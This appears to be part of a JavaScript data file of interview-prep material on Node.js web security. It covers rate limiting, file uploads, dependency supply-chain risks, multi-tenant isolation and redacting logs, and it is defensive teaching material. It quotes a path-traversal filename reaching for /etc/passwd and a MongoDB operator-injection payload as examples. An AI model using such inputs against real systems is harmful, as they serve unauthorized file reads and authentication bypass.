      answer30: "Rate limiting caps requests per client per time window and returns 429 with Retry-After. For login I limit both per account and per IP, add delays or CAPTCHA after failures instead of hard lockouts, and keep error messages generic. Counters live in Redis so all instances agree, trust proxy is set so I see real client IPs, and expensive endpoints like OTP, uploads and AI calls get stricter limits. Edge limits like WAF or API Gateway stop floods before they reach Node.",
      mistakes: [
        'In-memory counters with multiple instances.',
        "Forgetting `trust proxy`, so all users share the load balancer's IP and get blocked together.",
        'Hard account lockouts that let attackers lock out real users on purpose.',
        "Trap: 'Is IP-based limiting enough against credential stuffing?' No. Attackers rotate thousands of IPs; add per-account limits, breached-password checks and MFA.",
      ],
      takeaway: 'Limit per account and per IP, share counters in Redis, return 429 with Retry-After.',
    },

    {
      id: 'file-upload-security',
      title: 'File upload security',
      level: 'intermediate',
      priority: 'good',
      frequency: 'common',
      summary: "Limit size and type, check the real content not the extension, store outside your server with random names, and never serve uploads as executable content.",
      note: "On your resume: bulk CV uploads through S3 and SQS, and public token-scoped video uploads with presigned URLs on Octagnt. See 'Public token-based API for direct-to-S3 video uploads' in My Resume and Projects.",
      what: [
        "File uploads let users put their bytes on your system, so every upload is untrusted. Risks include huge files that fill disks or memory, malicious files (malware, HTML or SVG with scripts), files named to escape folders (`../../etc/passwd`), and files that crash parsers.",
        "Basic rules: set size and count limits, allow only the types you need, check the file's actual content (magic bytes), rename files to random ids, store them in object storage like S3 rather than on the web server, and serve them with safe headers.",
      ],
      deeper: [
        "The browser's `Content-Type` and the file extension are chosen by the client and can lie. Check magic bytes (for example with the `file-type` package) and still treat the file as untrusted. For images, re-encoding them (sharp) strips hidden payloads and metadata.",
        "Serving: a user-uploaded HTML or SVG file served from your main domain can run scripts in your origin (stored XSS). Serve uploads from a separate domain or S3, with `Content-Disposition: attachment` for downloads and `X-Content-Type-Options: nosniff`.",
        "Large files: upload straight to S3 with presigned URLs so bytes never pass through Node. Keep URLs short-lived, build the S3 key on the server (tenant prefix + random id), and limit size (presigned POST policies support `content-length-range`). Process files asynchronously (queue + worker), scan them for malware, and only mark them available after checks pass.",
        "Parsing risks: zip bombs, huge images (decompression bombs), and PDF or Office parsers with their own bugs. Run heavy parsing in workers with time and memory limits.",
      ],
      why: "Upload features are a common way into a system: a single unchecked file can become stored XSS, a full disk, or malware delivered to every recruiter who opens a CV.",
      analogy: "A mailroom that accepts parcels from strangers. It weighs each parcel (size limit), X-rays it rather than trusting the label (magic bytes), gives it an internal tracking number (random name), and stores it in a separate warehouse, not on the CEO's desk (S3, separate domain).",
      code: {
        lang: 'js',
        title: 'multer with limits + content check (Express)',
        source: `import multer from 'multer';
import { fileTypeFromBuffer } from 'file-type';
import { randomUUID } from 'node:crypto';

const upload = multer({
  storage: multer.memoryStorage(),           // small files only; use presigned S3 URLs for big ones
  limits: { fileSize: 5 * 1024 * 1024, files: 1 }, // 5 MB, one file
});

const ALLOWED = new Set(['application/pdf', 'image/png', 'image/jpeg']);

app.post('/resumes', auth, upload.single('file'), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file' });

  const detected = await fileTypeFromBuffer(req.file.buffer);  // real type from magic bytes
  if (!detected || !ALLOWED.has(detected.mime)) {
    return res.status(415).json({ error: 'Only PDF, PNG or JPEG' });
  }

  const key = \`\${req.user.tenantId}/resumes/\${randomUUID()}.\${detected.ext}\`; // never the user's filename
  await s3.send(new PutObjectCommand({
    Bucket: process.env.UPLOAD_BUCKET, Key: key, Body: req.file.buffer,
    ContentType: detected.mime, ContentDisposition: 'attachment',
  }));
  await scanQueue.send({ key, tenantId: req.user.tenantId }); // async malware scan
  res.status(202).json({ key, status: 'scanning' });
});`,
      },
      output: "A 6 MB file is rejected by multer's size limit. A file named `cv.pdf` that is really an HTML page is rejected with 415 because its magic bytes don't match PDF. A real PDF is stored under a random key in the tenant's S3 prefix and marked 'scanning' until the worker clears it.",
      questions: [
        { q: 'How do you secure a file upload endpoint?', a: 'Limit size and count, allowlist types and verify the real content by magic bytes, rename to a random id, store in S3 or outside the web root, scan asynchronously, and serve with safe headers from a separate domain.' },
        { q: 'Why not trust the file extension or Content-Type?', a: 'Both are set by the client and can be anything. Only inspecting the content, and still treating it as untrusted, tells you what the file really is.' },
        { q: 'Why is uploading an SVG risky?', a: 'SVG is XML that can contain JavaScript. Served inline from your domain, it can run scripts in your origin, which is stored XSS.' },
        { q: 'Why use presigned URLs for large uploads?', a: 'The browser uploads straight to S3, so big files never consume your server\'s memory or bandwidth. The server still controls the key, expiry and size limits.' },
      ],
      answer30: "Every upload is untrusted. I set size and count limits, allowlist types and check the real content with magic bytes rather than the extension, rename files to random ids under a tenant prefix, and store them in S3, not on the app server. Large files go direct to S3 with short-lived presigned URLs. Files are scanned asynchronously before they're available, and served with Content-Disposition attachment and nosniff, ideally from a separate domain, so an HTML or SVG file can't become stored XSS.",
      mistakes: [
        "Using the user's original filename as the storage path (path traversal, overwrites).",
        'Reading whole uploads into memory with no size limit.',
        'Serving uploads from the same origin as the app with inline disposition.',
        'Long-lived or reusable presigned URLs.',
        "Trap: 'We check the MIME type, so we're safe?' The client sets that header. Check magic bytes, and even then treat the file as untrusted.",
      ],
      takeaway: 'Limit, verify content, rename, store elsewhere, scan, and serve safely.',
    },

    {
      id: 'dependency-supply-chain',
      title: 'Dependency vulnerabilities and supply-chain security',
      level: 'intermediate',
      priority: 'must',
      frequency: 'common',
      summary: 'Most of your code is other people\'s packages. Lock versions, audit in CI, update deliberately, and watch for compromised releases, not just known CVEs.',
      what: [
        "A typical Node app has hundreds of packages, mostly transitive (dependencies of your dependencies). Two kinds of risk: **known vulnerabilities** in a package version (a CVE), and **supply-chain attacks**, where an attacker publishes a malicious version of a popular package.",
        "`npm audit` checks your lockfile against a database of known vulnerabilities. `npm audit fix` upgrades within allowed ranges. Tools like Dependabot or Renovate open update PRs automatically.",
      ],
      deeper: [
        "Real supply-chain attacks: in September 2025 attackers phished an npm maintainer and published malicious versions of very popular packages like `chalk` and `debug`; days later the 'Shai-Hulud' worm stole npm and cloud tokens and used them to republish hundreds of other packages. Earlier classics: event-stream (2018) and typosquatting packages with names close to real ones.",
        "Defences: commit the lockfile and install with `npm ci` so CI gets exactly the reviewed versions; review new dependencies (maintenance, downloads, install scripts) before adding them; consider disabling install scripts (`npm ci --ignore-scripts`) where possible; delay adopting brand-new versions (some package managers support a minimum release age); run `npm audit --audit-level=high` and a scanner (Snyk, GitHub Dependabot alerts) in CI; check registry signatures with `npm audit signatures`; and use short-lived, scoped publish credentials (trusted publishing from CI) for packages you publish.",
        "Triage, don't panic: an audit finding in a dev-only build tool or an unreachable code path is lower priority than one in your request-handling path. If no fix exists, use `overrides` in package.json to force a patched transitive version, or replace the package.",
        "Also keep the runtime current: Node release lines reach end-of-life and stop getting security fixes, so stay on a supported LTS.",
      ],
      why: "The OWASP Top 10:2025 lists Software Supply Chain Failures at A03. One compromised package runs with the same access as your own code, including your secrets.",
      analogy: "Cooking with ingredients from many suppliers. You check recalls (npm audit), buy from known brands (vetting), keep receipts of exactly what you bought (lockfile), and don't serve a brand-new product from an unknown supplier the day it appears.",
      code: [
        {
          lang: 'bash',
          title: 'Everyday commands',
          source: `npm ci                          # install exactly what the lockfile says
npm audit --audit-level=high    # fail on high/critical known vulnerabilities
npm audit signatures            # verify registry signatures and provenance
npm outdated                    # see what can be updated
npm ls lodash                   # why is this transitive package here?`,
        },
        {
          lang: 'json',
          title: 'package.json: force a patched transitive version',
          source: `{
  "overrides": {
    "semver": "^7.5.4"
  }
}`,
        },
      ],
      output: "`npm audit` lists each vulnerable package, its severity, the dependency path that pulls it in, and whether a fix is available; with `--audit-level=high` the command exits non-zero (failing CI) only for high or critical issues. `overrides` forces every copy of semver in the tree to a patched version.",
      questions: [
        { q: 'How do you handle vulnerable dependencies?', a: 'Run npm audit and a scanner like Dependabot in CI, prioritize by severity and whether the vulnerable code is reachable, update or use overrides for transitive packages, and replace abandoned packages.' },
        { q: 'What is a software supply-chain attack?', a: 'An attacker compromises something you depend on, like a popular npm package or a build tool, so malicious code runs inside your app or CI. The 2025 chalk/debug compromise and the Shai-Hulud worm are recent examples.' },
        { q: 'Why commit the lockfile and use npm ci?', a: 'So every install, especially in CI and production, uses exactly the versions you reviewed and tested, instead of silently pulling a newer, possibly malicious, version.' },
        { q: 'What do you check before adding a new package?', a: 'Whether you really need it, its maintenance activity and popularity, number of dependencies, install scripts, licence, and known vulnerabilities.' },
      ],
      answer30: "Most of an app's code is third-party, so I treat dependencies as a risk. I commit the lockfile and install with npm ci, run npm audit at high severity and Dependabot in CI, and triage findings by whether the code is actually reachable, using overrides for transitive fixes. Supply-chain attacks like the 2025 chalk and debug compromise mean known CVEs aren't the only risk, so I vet new packages, limit install scripts, avoid adopting brand-new releases instantly, and keep secrets away from build steps that don't need them.",
      mistakes: [
        'Running `npm install` in CI instead of `npm ci`.',
        'Blindly running `npm audit fix --force`, which can install breaking major versions.',
        'Ignoring audit output forever because "it is all dev dependencies".',
        "Trap: 'npm audit is clean, so we're safe?' It only knows about reported vulnerabilities. A freshly compromised package won't be listed yet.",
      ],
      takeaway: 'Lockfile + npm ci, audit in CI, vet and delay new packages, update deliberately.',
    },

    {
      id: 'multi-tenant-isolation',
      title: 'Multi-tenant data isolation',
      level: 'advanced',
      priority: 'must',
      frequency: 'common',
      summary: "In a shared database, the tenant must come from the verified token and be applied to every query, cache key, file path and background job.",
      note: "On your resume: you built tenant-scoped REST APIs on Octagnt with isolation enforced on every MongoDB query. The full first-person answer is in 'Multi-tenant APIs and tenant isolation' in My Resume and Projects; this topic is the security view of the same idea.",
      what: [
        "In a multi-tenant SaaS, many customer companies (tenants) share one app and often one database. The worst bug is a cross-tenant leak: company A sees company B's candidates.",
        "Isolation models: **shared database with a tenantId column/field** (cheapest, most common), **database or schema per tenant** (stronger, more ops work), and **separate deployment per tenant** (strongest, most expensive).",
      ],
      deeper: [
        "In a shared database, isolation is only as strong as your weakest query. So: take `tenantId` only from the verified token, never from the body, query or a header the client controls; apply it in one central layer (repository, Mongoose plugin, or Postgres row-level security) instead of every controller; make every aggregation start with `$match: { tenantId }`; and put tenantId first in compound indexes.",
        "The leaks usually happen outside the main CRUD path: caches whose keys lack the tenant, S3 keys or presigned URLs not scoped to the tenant, queue messages and cron jobs that lose the tenant context, search indexes, exports, analytics, logs and admin tools. Cross-tenant admin features need explicit, audited elevation.",
        "Test it like an attacker: automated tests that call every endpoint with tenant A's token and tenant B's ids and expect 404. Return 404 rather than 403 so the other tenant's record isn't confirmed to exist.",
        "Noisy neighbours are an availability issue in the same design: rate limits and quotas per tenant stop one tenant from starving the rest.",
      ],
      why: "One cross-tenant leak can end a B2B SaaS company's trust with every customer at once. It's a form of Broken Access Control, OWASP's number one risk.",
      analogy: "A shared office building with many companies. Everyone uses the same lifts and corridors, but each company's cabinets have their own lock, and the building's master system checks your company badge at every door, including the archive room and the loading dock.",
      code: {
        lang: 'ts',
        title: 'Central enforcement with a Mongoose plugin',
        source: `import { Schema } from 'mongoose';
import { AsyncLocalStorage } from 'node:async_hooks';

// Request-scoped context: set once per request after the JWT is verified
export const tenantContext = new AsyncLocalStorage<{ tenantId: string }>();

export function tenantPlugin(schema: Schema) {
  schema.add({ tenantId: { type: String, required: true, index: true } });

  const scope = function (this: any) {
    const ctx = tenantContext.getStore();
    if (!ctx) throw new Error('No tenant context: refusing to run an unscoped query'); // fail closed
    this.where({ tenantId: ctx.tenantId });
  };
  for (const op of ['find', 'findOne', 'countDocuments', 'updateOne', 'updateMany',
                    'deleteOne', 'deleteMany', 'findOneAndUpdate', 'findOneAndDelete']) {
    schema.pre(op as any, scope);
  }
  schema.pre('aggregate', function () {
    const ctx = tenantContext.getStore();
    if (!ctx) throw new Error('No tenant context');
    this.pipeline().unshift({ $match: { tenantId: ctx.tenantId } });
  });
}

// Middleware, after auth: tenant comes ONLY from the verified token
app.use((req, res, next) => tenantContext.run({ tenantId: req.user.tenantId }, next));`,
      },
      output: "Every find, update, delete and aggregation on a model using the plugin is automatically filtered by the current request's tenant. A query that runs without a tenant context, for example in a background job that forgot to set it, throws instead of silently reading every tenant's data.",
      questions: [
        { q: 'How do you isolate tenants in a shared database?', a: 'Every document has a tenantId taken from the verified token, and a central layer (repository, ORM middleware or row-level security) adds it to every query, with tests that try cross-tenant access.' },
        { q: 'Where do cross-tenant leaks usually happen?', a: 'Outside normal CRUD: cache keys without the tenant, S3 paths and presigned URLs, background jobs and queues that lose tenant context, aggregations, exports, search indexes and admin tools.' },
        { q: 'Shared DB vs database per tenant: security trade-off?', a: 'Shared is cheaper and simpler but relies on every query being filtered. Database per tenant gives stronger isolation and easier per-tenant backup or deletion, at the cost of more operational work.' },
        { q: 'Why should a missing tenant context fail closed?', a: 'If the code silently runs without a filter, one bug exposes every tenant. Throwing an error turns a data leak into a visible failure.' },
      ],
      answer30: "In a shared-database SaaS, every record carries a tenantId, and the tenant comes only from the verified token. I enforce the filter centrally, through a repository or Mongoose middleware that fails closed if there's no tenant context, and aggregations always start with a tenant match. Then I check the places leaks really happen: cache keys, S3 prefixes and presigned URLs, queue messages, exports and logs. Tests call endpoints with one tenant's token and another tenant's ids and expect 404.",
      mistakes: [
        'Reading tenantId from the request body, query string or a client-set header.',
        "Writing `{ tenantId, ...filter }`, letting a client-supplied `filter.tenantId` override it.",
        'Background jobs that run without tenant context.',
        "Trap: 'Mongoose middleware covers everything?' No. `aggregate`, `bulkWrite`, raw driver calls and some model methods need separate handling, so pair middleware with tests.",
      ],
      takeaway: 'Tenant from the token, enforced centrally, fail closed, and test cross-tenant access everywhere data lives.',
    },

    {
      id: 'logging-without-pii',
      title: 'Logging without leaking PII or secrets',
      level: 'intermediate',
      priority: 'good',
      frequency: 'common',
      summary: 'Log enough to investigate (who, what, when, request id) while redacting passwords, tokens and personal data before anything is written.',
      note: "On your resume: on Skillkeepr you built an audit logging service that redacts sensitive fields before storing. See 'Audit and usage logging with buffered, non-blocking writes' in My Resume and Projects.",
      what: [
        "Logs are copied to many places (log services, dashboards, support tickets) and kept a long time, so anything in them is effectively widely shared. Passwords, tokens, cookies, OTPs and personal data (PII: names, emails, phone numbers, ID numbers, CVs) must not end up there in plain form.",
        "At the same time, OWASP A09:2025 is Security Logging and Alerting Failures: you need enough logging to detect and investigate attacks. The goal is useful logs without sensitive data.",
      ],
      deeper: [
        "Log the event, not the payload: user id, tenant id, action, resource id, result, IP, request id and timestamp. Avoid dumping `req.body`, `req.headers` or whole error objects that may contain configs or queries.",
        "Redact centrally, not by memory: use the logger's redaction feature (pino `redact` paths) or a shared redact function, and mask values you need partially (`a***@example.com`). Use structured JSON logs so redaction rules and searches are reliable.",
        "Separate audit logs (who did what, for compliance; append-only, longer retention, restricted access) from application logs (debugging; shorter retention). Apply retention limits; privacy laws such as GDPR and India's DPDP Act expect personal data to be minimized and not kept longer than needed.",
        "Alert on security events: spikes in failed logins, many 403/404s from one user (IDOR probing), rate-limit hits, and admin actions.",
      ],
      why: "A log store full of tokens and personal data is a second, poorly protected copy of your database. Leaks through logs are common and often go unnoticed.",
      analogy: "A CCTV log for an office: it records who entered which room and when, but the camera is not pointed at people's screens or PIN pads.",
      code: {
        lang: 'js',
        title: 'Redact before writing (node redact.mjs)',
        source: `const SENSITIVE = ['password', 'token', 'authorization', 'cookie', 'otp', 'secret', 'aadhaar'];

function redact(value) {
  if (Array.isArray(value)) return value.map(redact);
  if (value && typeof value === 'object') {
    return Object.fromEntries(
      Object.entries(value).map(([k, v]) =>
        SENSITIVE.some((s) => k.toLowerCase().includes(s)) ? [k, '[REDACTED]'] : [k, redact(v)])
    );
  }
  return value;
}

const maskEmail = (e) => e.replace(/^(.).*(@.*)$/, '$1***$2');

const logEntry = {
  route: 'POST /login',
  user: { email: maskEmail('asha.menon@example.com'), password: 'hunter2' },
  headers: { Authorization: 'Bearer eyJhbGci...', 'user-agent': 'Mozilla/5.0' },
  requestId: 'req-42',
};
console.log(JSON.stringify(redact(logEntry), null, 2));

// With pino, the same idea is built in:
// const logger = pino({ redact: ['req.headers.authorization', 'req.headers.cookie', '*.password'] });`,
      },
      output: "The printed entry keeps the route, the user agent and the request id, shows the email as `a***@example.com`, and replaces both the password and the Authorization header with `[REDACTED]`.",
      questions: [
        { q: 'What should never appear in logs?', a: 'Passwords, tokens, session cookies, API keys, OTPs, full card or ID numbers, and unnecessary personal data such as full CV text or phone numbers.' },
        { q: 'What should a good security log entry contain?', a: 'Who (user and tenant id), what action on which resource, the result, when, from where (IP), and a request id to correlate events, without the sensitive payload.' },
        { q: 'How do you make sure developers don\'t log secrets by accident?', a: 'Central redaction in the logger configuration, structured logging helpers instead of logging raw request objects, code review, and automated scanning of logs for token patterns.' },
        { q: 'What is the difference between audit logs and application logs?', a: 'Audit logs record who did what for compliance; they are append-only, access-restricted and kept longer. Application logs are for debugging, noisier and kept for less time.' },
      ],
      answer30: "I log events, not payloads: who, which tenant, what action on which resource, the result, the IP and a request id. Sensitive fields like passwords, tokens, cookies and OTPs are redacted centrally in the logger, and personal data like emails is masked or left out. Audit logs are separate, append-only and access-controlled, with retention limits for privacy laws. And logging has to feed alerts, like spikes in failed logins or 404s, otherwise attacks go unnoticed.",
      mistakes: [
        'Logging `req.body` or full request headers on every request.',
        'Logging full error objects that include database connection strings or tokens.',
        "Matching sensitive keys too loosely (a key list containing 'pan' would also redact 'company'), or too narrowly (missing 'accessToken').",
        "Trap: 'We redact in production only.' Staging and dev logs often hold copies of real data too; redact everywhere.",
      ],
      takeaway: 'Log who, what, when and the request id; redact secrets and PII centrally before writing.',
    },
  ],

  rapidFire: [
    { q: 'OWASP Top 10:2025 number one?', a: 'Broken Access Control.' },
    { q: 'Where did SSRF go in the 2025 list?', a: 'Merged into A01 Broken Access Control.' },
    { q: 'Three types of XSS?', a: 'Stored, reflected and DOM-based.' },
    { q: 'Main React XSS hole?', a: 'dangerouslySetInnerHTML (plus javascript: URLs).' },
    { q: 'What does SameSite=Lax block?', a: 'Sending the cookie on cross-site POSTs, iframes and fetch; top-level GET links still send it.' },
    { q: 'SameSite=None requires what?', a: 'The Secure flag.' },
    { q: 'Does CORS stop CSRF?', a: 'No. Simple cross-site requests are still sent; CORS only blocks reading the response.' },
    { q: 'Mongo operator injection example?', a: '{ "token": { "$ne": null } } passed into a filter.' },
    { q: 'Best password hash today?', a: 'Argon2id; bcrypt (cost 12) is still acceptable.' },
    { q: 'Why salt a password?', a: 'So identical passwords hash differently and precomputed tables are useless.' },
    { q: 'jwt.decode vs jwt.verify?', a: 'decode only reads; verify checks signature and expiry.' },
    { q: 'Defence against alg none?', a: 'Always pass an explicit algorithms list to verify.' },
    { q: 'What is refresh token rotation?', a: 'Each refresh issues a new token; reuse of an old one revokes the family.' },
    { q: 'Why regenerate session id at login?', a: 'To prevent session fixation.' },
    { q: 'OAuth vs OIDC?', a: 'OAuth is authorization (access tokens); OIDC adds identity (ID token).' },
    { q: 'What does PKCE protect?', a: 'A stolen authorization code being exchanged by someone else.' },
    { q: 'What is IDOR?', a: 'Accessing another user\'s record by changing an id because ownership isn\'t checked.' },
    { q: 'Can Allow-Origin * be used with cookies?', a: 'No; credentials need a specific origin.' },
    { q: 'Header that blocks clickjacking?', a: "CSP frame-ancestors 'none' (or X-Frame-Options: DENY)." },
    { q: 'What does HSTS do?', a: 'Forces the browser to use HTTPS for the domain.' },
    { q: 'First step after a secret leaks to GitHub?', a: 'Rotate it.' },
    { q: 'Status code for rate limiting?', a: '429 Too Many Requests with Retry-After.' },
    { q: 'How to verify an upload\'s real type?', a: 'Check magic bytes, not the extension or Content-Type.' },
    { q: 'npm install or npm ci in CI?', a: 'npm ci, which installs exactly the lockfile.' },
    { q: 'Where must tenantId come from?', a: 'The verified token, never the request body or query.' },
  ],
};

export default security;
